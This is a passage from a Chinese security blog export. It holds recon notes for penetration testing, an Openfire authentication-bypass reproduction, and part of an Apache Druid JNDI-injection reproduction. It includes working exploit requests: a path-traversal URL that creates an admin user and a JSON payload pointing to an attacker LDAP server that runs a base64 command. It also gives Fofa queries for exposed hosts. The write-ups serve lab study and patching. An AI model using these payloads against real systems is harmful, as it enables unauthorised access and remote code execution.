title="收集工具"></a>收集工具</h4><ul><li><p><code>OneForAll</code></p><blockquote><p>一条龙，需要配置api，配合代理使用效果更佳</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target domain run</span><br><span class="line">python oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure></li><li><p>水泽</p></li></ul><h4 id="探活工具"><a href="#探活工具" class="headerlink" title="探活工具"></a>探活工具</h4><ul><li><code>httpx</code></li></ul><h2 id="IP段信息收集"><a href="#IP段信息收集" class="headerlink" title="IP段信息收集"></a>IP段信息收集</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>From[BYPASS-CDN&#x2F;CDN 2023 完全攻击指南（一）.md at main · bin-maker&#x2F;BYPASS-CDN · GitHub](<a href="https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN">https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN</a> 2023 完全攻击指南（一）.md)</p><h4 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h4><p>CDN（Content Delivery Network），中文全称为内容分发网络。</p><p>简单的说就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的<strong>静态数据</strong>资源直接<strong>缓存</strong>到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户<strong>有实际数据交互时</strong>才会<strong>从远程Web服务器上响应</strong>，这样可以大大提高网站的响应速度及用户体验。</p><h4 id="为什么-1"><a href="#为什么-1" class="headerlink" title="为什么"></a>为什么</h4><ul><li>绕过寻找真实IP</li><li>绕过云Waf</li></ul><h4 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h4><ul><li><p>反查域名 IP，看结果是否有大量不相关的域名存在</p></li><li><p>观察请求响应的返回数据的头部，是否有 CDN 服务商标识</p></li><li><p>通过不同定位地点的 ping 测试，如果没有使用CDN，则只会显示一个IP地址。</p><ul><li><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a>（国内+国外）</li><li><a href="https://www.host-tracker.com/v3/check/">https://www.host-tracker.com/v3/check/</a>  （国外）</li></ul></li><li><p>判断 IP 是否在常见 CDN 服务商的服务器 IP 段上</p></li><li><p>若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN</p></li><li><p>利用 Nslookup 查询域名</p><ul><li><p>服务器名称</p><p><img src="/../images/image-20230509225424444-1685533751888.png" alt="image-20230509225424444"></p></li><li><p>同一个域名解析对应多个 IP 地址</p><p><img src="/../images/image-20230509225313449-1685533751888.png" alt="image-20230509225313449"></p></li></ul></li></ul><h4 id="CDN绕过方法"><a href="#CDN绕过方法" class="headerlink" title="CDN绕过方法"></a>CDN绕过方法</h4><h5 id="CDN费用"><a href="#CDN费用" class="headerlink" title="CDN费用"></a>CDN费用</h5><p>CDN 加速需要支付一定的费用，所以<strong>子站，国外</strong>很可能没有部署CDN。</p><h5 id="历史-DNS-记录"><a href="#历史-DNS-记录" class="headerlink" title="历史 DNS 记录"></a>历史 DNS 记录</h5><p><a href="https://viewdns.info/iphistory/?domain=www.baidu.com">IP History - ViewDNS.info</a></p><p><a href="https://x.threatbook.com/v5/domain/www.baidu.com?source=top">微步在线X情报社区-威胁情报查询_威胁分析平台_开放社区</a></p><h5 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h5><blockquote><p>用目标邮件服务器发送邮件给自己(QQ邮箱)再查看邮件源码一定情况下可以找到真实IP（服务端和我们建立连接）</p><p>这里还有一个<code>奇淫技巧</code>，通过发送邮件给一个不存在的邮箱地址，比如 <a href="mailto:000xxx@domain.com">000xxx@domain.com</a> ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。</p></blockquote><ul><li>RSS 订阅</li><li>邮箱注册、激活处</li><li>邮箱找回密码处</li><li>产品更新的邮件推送</li><li>某业务执行后发送的邮件通知</li><li>员工邮箱、邮件管理平台等入口处的忘记密码</li></ul><h5 id="virtual-host-碰撞"><a href="#virtual-host-碰撞" class="headerlink" title="virtual-host 碰撞"></a>virtual-host 碰撞</h5><p>原理：<a href="https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg">https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg</a></p><ul><li>当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。</li><li>在线收集工具 <a href="https://pentest-tools.com/information-gathering/find-virtual-hosts">https://pentest-tools.com/information-gathering/find-virtual-hosts</a></li></ul><h5 id="空间测绘引擎"><a href="#空间测绘引擎" class="headerlink" title="空间测绘引擎"></a>空间测绘引擎</h5><ul><li><p>favicon.ico 哈希特征</p></li><li><p>网页源码特征值</p><blockquote><p>在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。</p></blockquote></li></ul><h4 id="真实-IP-使用"><a href="#真实-IP-使用" class="headerlink" title="真实 IP 使用"></a>真实 IP 使用</h4><p>在获取到真实IP后，通过直接访问IP可能无法访问</p><ul><li><p>修改 hosts 文件</p></li><li><p>burpsuite 测试</p><p><img src="/../images/image-20230510181257028-1685533751888.png" alt="image-20230510181257028"></p></li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>FCDN</p><h3 id="C段及端口扫描"><a href="#C段及端口扫描" class="headerlink" title="C段及端口扫描"></a>C段及端口扫描</h3><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><ul><li><p>nmap</p><p>经典工具，唯一缺点就是慢</p></li><li><p>masscan</p><p>快，只能扫ip，可以导出结果联动nmap</p></li><li><p>rustscan</p><p>最快，并且可以直接联动nmap，但是感觉不是特别准确</p></li><li><p>goby</p><p>慢，有指纹识别</p></li></ul><h4 id="常见端口利用"><a href="#常见端口利用" class="headerlink" title="常见端口利用"></a>常见端口利用</h4><p><a href="https://fgtbnc.github.io/2023/05/02/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F/">端口渗透 | Khaz’s Blog (fgtbnc.github.io)</a></p><h2 id="新开的业务"><a href="#新开的业务" class="headerlink" title="新开的业务"></a>新开的业务</h2><p>对应新闻，公众号资讯等等</p><h1 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h1><h2 id="为什么-2"><a href="#为什么-2" class="headerlink" title="为什么"></a>为什么</h2><ul><li>运气好，一步到位</li><li>进一步了解目标</li><li>制作有针对性的弱口令字典</li><li>🎣</li></ul><h2 id="供应链公司"><a href="#供应链公司" class="headerlink" title="供应链公司"></a>供应链公司</h2><p><a href="https://xz.aliyun.com/t/10531">记一次通过供应链拿到目标后台权限的过程 - 先知社区</a></p><p><a href="https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg">红蓝对抗]-从供应商到靶标 (qq.com)</a></p><p>美国APT打伊朗</p><ul><li><p>为什么</p><p>试想一下，目标使用供应商提供的软件，那么这些软件是受到信任的。</p><p>所以我们可以通过攻击供应商，并在软件中植入恶意代码，这样目标在运行软件时也会运行恶意代码，从而达到攻击。并且供应商保存了目标的各种信息。</p></li><li><p>手段</p><ul><li>网站页底的备案，版权信息<img src="/../images/image-20230511130314346-1685533751887.png" alt="image-20230511130314346"></li><li>招标文件</li></ul></li></ul><h2 id="搜索引擎-1"><a href="#搜索引擎-1" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><ul><li><p>针对信息泄露的在线网站</p><ul><li><p><a href="https://leakix.net/">LeakIX</a></p></li><li><p><a href="https://intelx.io/">https://intelx.io/</a></p></li><li><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p></li><li><p><a href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></p></li><li><p><a href="https://dehashed.com/">https://dehashed.com/</a></p></li></ul></li><li><p><code>Google Hacking</code></p><ul><li><p>常用语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com  账号 | 密码 | 工号 | 学号 | 身份证 | 公示 | 邮箱</span><br></pre></td></tr></table></figure></li><li><p>工具</p><p><a href="https://github.com/dwisiswant0/go-dork">https://github.com/dwisiswant0/go-dork</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\go-dork.exe -q &quot;[语法]&quot; -p [页面数量] -x http://127.0.0.1:33210 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一页10个数据</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e 指定引擎 测试了只有google可以</span><br><span class="line">Google, Shodan, Bing, Duck, Yahoo, Ask</span><br></pre></td></tr></table></figure><p>​<img src="/../images/image-20230510222146978-1685533751888.png" alt="image-20230510222146978"></p></li></ul></li></ul><p>​</p><ul><li><p>网站</p><p><a href="https://ght.se7ensec.cn/#">在线Google Hacking小工具</a></p><p><img src="/../images/image-20230509215656848-1685533751889.png" alt="image-20230509215656848"></p><p><a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database (GHDB) - Google Dorks, OSINT, Recon</a></p><p><img src="/../images/image-20230509151606375-1685533751889.png" alt="image-20230509151606375"></p></li></ul><h2 id="目录-x2F-文件扫描"><a href="#目录-x2F-文件扫描" class="headerlink" title="目录&#x2F;文件扫描"></a>目录&#x2F;文件扫描</h2><p><strong>关键是字典，需要积累字典</strong></p><ul><li><p>工具：dirsearch</p></li><li><p>字典</p><p>将工具内置字典和公开字典进行整合，然后自己在实际中遇到的再添加。</p></li><li><p>注意点</p><p>403&#x2F;404状态码，可以进行逐级目录扫描</p><p>扫IP和扫域名是不一样的，因为一个ip可能有多个域名</p></li></ul><h2 id="JS中的信息"><a href="#JS中的信息" class="headerlink" title="JS中的信息"></a>JS中的信息</h2><p>可能泄露接口，后台地址，密码等敏感信息</p><ul><li><p>工具</p><p><code>Urlfinder</code>  （推荐）</p></li><li><p>浏览器插件</p><p>Superesearch</p><p>用工具找到的路径需要验活，有时候还需要拼接一级路由才可以（一级路由等可以通过抓包分析得到）。</p></li></ul><h2 id="代码托管平台"><a href="#代码托管平台" class="headerlink" title="代码托管平台"></a>代码托管平台</h2><ul><li><p>github</p><p>工具</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/damit5/gitdorks_go</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./gitdorks_go_amd_linux -gd Dorks/smalldorks.txt -nws 20 -target gm7.org -tf tokenFile/tf.txt -ew 3</span><br></pre></td></tr></table></figure><blockquote><p><code>./tokenFile/tf.txt</code> → <code>Github access token</code></p><p><code>../Dorks/smalldorks.txt</code> →  <code>关键字字典</code></p></blockquote></li><li><p>GitLab: <a href="https://about.gitlab.com/">https://about.gitlab.com/</a></p></li><li><p>gitee: <a href="https://gitee.com/">https://gitee.com/</a></p></li></ul><h2 id="招聘信息"><a href="#招聘信息" class="headerlink" title="招聘信息"></a>招聘信息</h2><p>可以通过该公司的招聘岗位信息，分析其技术栈，得到对方网站的架构。</p><h2 id="网盘信息"><a href="#网盘信息" class="headerlink" title="网盘信息"></a>网盘信息</h2><p>聚合网站：<a href="https://www.chaonengsou.com/">超能搜 - 百度网盘搜索神器</a></p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><blockquote><p>从各第三方历史漏洞库中查找目标曾经泄露的 各种敏感账号密码 [ 国内目标很好使？ ]</p></blockquote><p><a href="https://www.cnvd.org.cn/">国家信息安全漏洞共享平台</a></p><p><a href="https://src.sjtu.edu.cn/">主页 | 教育漏洞报告平台</a></p><h2 id="技术文档-x2F-wiki-x2F-知识库"><a href="#技术文档-x2F-wiki-x2F-知识库" class="headerlink" title="技术文档 &#x2F; wiki &#x2F;知识库"></a>技术文档 &#x2F; wiki &#x2F;知识库</h2><p>目标自己对外提供的各种文档里泄露的各种账号密码及其它敏感信息</p><ul><li><p>官网</p></li><li><p><a href="https://www.yuque.com/dashboard">工作台 · 语雀</a></p></li><li><p>百度文库：<a href="https://wenku.baidu.com/">https://wenku.baidu.com</a></p><p>原创力文档：<a href="https://max.book118.com/">https://max.book118.com</a></p><p>凌风云：<a href="https://wenku.lingfengyun.com/">https://wenku.lingfengyun.com</a></p></li></ul><h2 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h2><p>报错信息中通常有web服务器的各种信息，如物理路径，组件信息，主机系统等</p><h2 id="视频平台"><a href="#视频平台" class="headerlink" title="视频平台"></a>视频平台</h2><p>搜索教程类视频，比如后台登陆等</p><h2 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h2><h3 id="打入目标内部"><a href="#打入目标内部" class="headerlink" title="打入目标内部"></a>打入目标内部</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加入内部QQ群 / 微信群 / 钉钉群 等</span><br><span class="line">社工内部人员</span><br><span class="line">近源渗透</span><br></pre></td></tr></table></figure><h3 id="个人信息使用"><a href="#个人信息使用" class="headerlink" title="个人信息使用"></a>个人信息使用</h3><ul><li><p>将前面收集到的姓名，邮箱，手机号等个人信息放入社工库查询</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p><blockquote><p>通过搜索引擎、PGP服务器以及SHODAN数据库收集用户的email，子域名，主机，雇员名，开放端口和banner信息。</p></blockquote></li><li><p>生成社工字典，进行口令爆破</p><p><a href="https://github.com/zgjx6/SocialEngineeringDictionaryGenerator">https://github.com/zgjx6/SocialEngineeringDictionaryGenerator</a></p></li></ul><h1 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h1><h2 id="为什么-3"><a href="#为什么-3" class="headerlink" title="为什么"></a>为什么</h2><ul><li><p><strong>筛选出最可能有漏洞的点</strong></p></li><li><p><strong>识别waf</strong></p></li></ul><h2 id="指纹识别-1"><a href="#指纹识别-1" class="headerlink" title="指纹识别"></a>指纹识别</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://github.com/TideSec/TideFinger/blob/master/Web%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E4%B8%8E%E4%BC%98%E5%8C%96%E5%AE%9E%E7%8E%B0.md">TideFinger&#x2F;Web指纹识别技术研究与优化实现.md at master · TideSec&#x2F;TideFinger</a></p><h3 id="Web应用框架"><a href="#Web应用框架" class="headerlink" title="Web应用框架"></a>Web应用框架</h3><h4 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h4><ul><li><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p><img src="/../images/image-20230511175807888-1685533751889.png" alt="image-20230511175807888"></p></li><li><p><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p><img src="/../images/image-20230511110926338-1685533751889.png" alt="image-20230511110926338"></p></li></ul><h4 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h4><ul><li><p><a href="https://fp.shuziguanxing.com/#/">指纹收录平台</a></p></li><li><p><a href="http://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台</a>（要注册,有一定门槛）</p></li><li><p><a href="http://finger.tidesec.com/">http://finger.tidesec.com/</a></p></li></ul><h4 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h4><p>Wappalyzer</p><h4 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h4><ul><li>前端js代码，文件名，路径等放到github，gitee搜</li><li>icon信息等放到空间搜索引擎</li><li>图片搜索（不过通常会进行替换）</li><li>版权标识如url，logo等（注释或者删除了）</li></ul><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><ul><li><p>查看返回包有无WAF字样</p><p><img src="/../images/image-20230511233014884-1685533751889.png" alt="image-20230511233014884"></p></li><li><p><a href="https://github.com/EnableSecurity/wafw00f">WAFW00F </a></p></li><li><p>查看拦截页面信息</p><blockquote><p>通过一些明显的注入来触发waf</p></blockquote><p><a href="https://cloud.tencent.com/developer/beta/article/1872310">83个Waf拦截页面-腾讯云开发者社区-腾讯云</a>  （5年前）</p><p><a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">30几款常见WAF的拦截页整理</a>   （2021年）</p></li></ul><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><p><a href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></p><p><a href="https://send-safe-honeypot-hunter.apponic.com/">https://send-safe-honeypot-hunter.apponic.com/</a></p><h1 id="漏洞探测与利用"><a href="#漏洞探测与利用" class="headerlink" title="漏洞探测与利用"></a>漏洞探测与利用</h1><h2 id="漏扫工具"><a href="#漏扫工具" class="headerlink" title="漏扫工具"></a>漏扫工具</h2><h2 id="手工测试"><a href="#手工测试" class="headerlink" title="手工测试"></a>手工测试</h2><h1 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h1><h1 id="待做"><a href="#待做" class="headerlink" title="待做"></a>待做</h1><blockquote><p>把上面的几个步骤，工具串起来，行成快速信息收集，快速探测打点，最好写个贯穿流程的工具调用的脚本。</p></blockquote><p>参考：</p><p><a href="https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/">https://www.se7ensec.cn/2023/02/14/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p><p><a href="https://github.com/ybdt/info-hub">ybdt&#x2F;info-hub: 资产收集、指纹识别</a></p><h1 id="产出报告"><a href="#产出报告" class="headerlink" title="产出报告"></a>产出报告</h1><p><a href="https://www.anquanke.com/post/id/215031#h3-5">如何编写一份专业的渗透测试报告-安全客 - 安全资讯平台</a></p><p><a href="https://github.com/Potato-py/ExportReport">Potato-py&#x2F;ExportReport: 本项目用于自动化生成报告。可根据项目需求，通过简单的提取变量来自定义报告模板。内附常见扫描器API&#x2F;原报告(awvs、xray、goby)数据提取模块，可直接生成全新的自定义报告。 对有复杂的功能需求时，适用于有Python基础的人使用。 本项目内附二次开发所用的资料文档，欢迎各位提Pull Request</a></p><p><a href="https://github.com/awake1t/HackReport/tree/main/01-%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF">HackReport&#x2F;01-报告模板 at main · awake1t&#x2F;HackReport</a></p><p><strong>修复建议–渗透测试修复建议总结.pdf</strong></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.gm7.org/">Introduction </a></p><p><a href="https://gitbook.se7ensec.cn/#duan-kou-sao-miao">在线工具 - 肾透测试中心</a></p><p><a href="https://gitbook.se7ensec.cn/hong-dui-zuo-zhan-shou-ce#liu-cheng-jian-yao-shuo-ming">红队作战手册 - 肾透测试中心</a></p><p><a href="https://github.com/bin-maker/BYPASS-CDN/">https://github.com/bin-maker/BYPASS-CDN/</a></p><p><a href="https://www.secpulse.com/archives/194410.html">https://www.secpulse.com/archives/194410.html</a></p><p><a href="https://wiki.wgpsec.org/knowledge/">狼组安全团队公开知识库</a></p><p><a href="https://www.wangan.com/p/7fy7fy135d85fec8">https://www.wangan.com/p/7fy7fy135d85fec8</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Openfire身份认证绕过+插件Getshell漏洞复现</title>
      <link href="/2023/06/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Openfire/"/>
      <url>/2023/06/25/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Openfire/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>​Openfire的管理控制台是一个基于 Web 的应用程序，被发现可以使用UTF-16字符来绕过路径穿越的防护，从而以路径遍历的方式绕过权限校验。成功利用后，未经身份验证的用户可以访问 Openfire 管理控制台中的后台页面。</p><p>​同时由于Openfire管理控制台的后台提供了安装插件的功能，所以攻击者可以通过安装恶意插件达成远程代码执行的效果</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p> 3.10.0 &lt;&#x3D; Openfire &lt; 4.6.8</p><p> 4.7.0 &lt;&#x3D; Openfire 4.7.x &lt; 4.7.5</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><p>vulhub</p></li><li><p>Fofa语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;Openfire&quot;   49,485 条匹配结果 ( 23,657 条独立IP )</span><br></pre></td></tr></table></figure></li></ul><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p>工具</p><p><a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go run main.go -u http://openfire.com:9090</span><br><span class="line"></span><br><span class="line">go run main.go -l url.txt -t 20</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230625225708359.png" alt="image-20230625225708359"></p><p>手动</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=csrftoken&amp;username=hackme&amp;name=&amp;email=&amp;password=hackme&amp;passwordConfirm=hackme&amp;isadmin=on&amp;create=Create+User</span><br></pre></td></tr></table></figure><p>创建了一个用户名与密码均为hackme的用户</p><h3 id="插件getshell"><a href="#插件getshell" class="headerlink" title="插件getshell"></a>插件getshell</h3><p>使用增加的用户进入后台</p><p><img src="/../images/image-20230625224759596.png" alt="image-20230625224759596"></p><p>上传插件<a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar%EF%BC%8C%E6%9D%A5%E5%88%B0server">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar，来到server</a> settings</p><p><img src="/../images/image-20230625224848522.png" alt="image-20230625224848522"></p><p>输入密码后</p><p><img src="/../images/image-20230625224924825.png" alt="image-20230625224924825"></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>手动</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230625230442265.png" alt="image-20230625230442265"></p><p>nuclei</p><p><img src="/../images/image-20230625231354247.png" alt="image-20230625231354247"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级版本至<strong>4.6.8或4.7.5及以上</strong></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Apache Druid RCE漏洞复现(QVD-2023-9629)</title>
      <link href="/2023/06/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Druid/"/>
      <url>/2023/06/24/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Druid/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/vulhub/vulhub/tree/master">vulhub</a>&#x2F;<a href="https://github.com/vulhub/vulhub/tree/master/kafka">kafka</a>&#x2F;<a href="https://github.com/vulhub/vulhub/tree/master/kafka/CVE-2023-25194">CVE-2023-25194</a></p><p><img src="/../images/image-20230624162154282.png" alt="image-20230624162154282"></p><h2 id="Fofa语法"><a href="#Fofa语法" class="headerlink" title="Fofa语法"></a>Fofa语法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Druid&quot;         866 条</span><br><span class="line">js_name=&quot;console-config.js&quot;   850 条</span><br></pre></td></tr></table></figure><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache Kafka clients中存在一处<strong>JNDI注入</strong>漏洞。如果攻击者在连接的时候可以控制属性<code>sasl.jaas.config</code>的值为<code>com.sun.security.auth.module.JndiLoginModule</code>，则可以发起JNDI连接，进而导致JNDI注入漏洞，<strong>执行任意命令</strong>。</p><h2 id="影响版本和软件"><a href="#影响版本和软件" class="headerlink" title="影响版本和软件"></a>影响版本和软件</h2><p>2.3.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><p>使用Apache Kafka的软件<strong>Apache Druid</strong></p><blockquote><p>Apache Druid是一个高性能的实时大数据分析引擎，支持快速数据摄取、实时查询和数据可视化。它主要用于OLAP（在线分析处理）场景，能处理PB级别的数据。Druid具有高度可扩展、低延迟和高吞吐量的特点，广泛应用于实时监控、事件驱动分析、用户行为分析、网络安全等领域。通过使用Druid，企业和开发者可以快速获得实时分析结果，提升决策效率。</p><p>该应用的历史漏洞：</p><h5 id="Apache-Druid-JDBC反序列化代码执行漏洞（CVE-2021-26919）"><a href="#Apache-Druid-JDBC反序列化代码执行漏洞（CVE-2021-26919）" class="headerlink" title="Apache Druid JDBC反序列化代码执行漏洞（CVE-2021-26919）"></a>Apache Druid JDBC反序列化代码执行漏洞（CVE-2021-26919）</h5><h5 id="Apache-Druid-log4j-远程代码执行漏洞"><a href="#Apache-Druid-log4j-远程代码执行漏洞" class="headerlink" title="Apache Druid log4j 远程代码执行漏洞"></a>Apache Druid log4j 远程代码执行漏洞</h5><p><strong>未授权访问漏洞</strong></p></blockquote><p><strong>影响版本0.19.0 &lt;&#x3D; Apache Druid &lt;&#x3D; 25.0.0</strong></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>开启ldap服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.1-SNAPSHOT.jar -i 124.220.192.120</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230624155944899.png" alt="image-20230624155944899"></p><p>发送payload，替换其中的LDAP URL</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/druid/indexer/v1/sampler?for=connect</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip:8888</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">    <span class="string">&quot;spec&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">        <span class="string">&quot;ioConfig&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;consumerProperties&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;bootstrap.servers&quot;</span>:<span class="string">&quot;127.0.0.1:6666&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.mechanism&quot;</span>:<span class="string">&quot;SCRAM-SHA-256&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;security.protocol&quot;</span>:<span class="string">&quot;SASL_SSL&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.jaas.config&quot;</span>:<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=<span class="subst">\&quot;</span>ldap://roguo-jndi-server:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=<span class="subst">\&quot;</span> useFirstPass=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> serviceName=<span class="subst">\&quot;</span>x<span class="subst">\&quot;</span> debug=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> group.provider.url=<span class="subst">\&quot;</span>xxx<span class="subst">\&quot;</span>;&quot;</span></span></span><br><span class="line"><span class="language-swift">            &#125;,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;topic&quot;</span>:<span class="string">&quot;test&quot;</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;useEarliestOffset&quot;</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-swift">            <span class="string">&quot;inputFormat&quot;</span>:&#123;</span></span><br><span class="line"><span 